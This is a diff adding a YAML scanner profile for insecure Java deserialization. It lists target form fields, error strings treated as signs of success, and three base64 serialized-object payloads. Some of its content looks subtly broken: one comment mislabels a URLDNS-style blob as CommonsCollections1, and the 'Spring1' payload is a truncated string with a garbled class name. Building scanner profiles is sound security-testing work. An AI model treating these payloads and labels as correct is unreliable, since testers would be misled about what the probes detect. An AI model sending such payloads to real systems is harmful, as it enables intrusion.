@@ -1,0 +1,26 @@
+# Insecure Deserialization Attack Profile for Java
+name: "Java Deserialization"
+category: "deserialization"
+severity: "critical"
+description: "Tests for insecure deserialization vulnerabilities in Java using common gadget chains (e.g. ysoserial patterns)"
+supported_languages:
+  - "java"
+target_fields:
+  - "javax.faces.ViewState"
+  - "viewstate"
+  - "serialized"
+  - "java_obj"
+  - "serialized_object"
+success_indicators:
+  - "java.io.InvalidClassException"
+  - "java.lang.Runtime"
+  - "java.lang.IllegalArgumentException: Invalid base64"
+  - "org.apache.commons.collections"
+  - "org.springframework.beans.factory.ObjectFactory"
+payloads:
+  # Magic bytes: AC ED 00 05 (Hex) -> rO0AB (Base64)
+  - "rO0ABQ=="
+  # CommonsCollections1 (URLDNS - harmless ping)
+  - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTAYfeZsZ7C5DAwAHSQAIcG9ydGwAB3Byb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHEAfgADTAAEZmlsZXEAfgADeHAAAAAAdAAHZGF0YQ=="
+  # Spring1 (Base64 wrapper with typical magic bytes overhead)
+  - "rO0ABXNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmE5w6sAAAAAAAAAAQP="
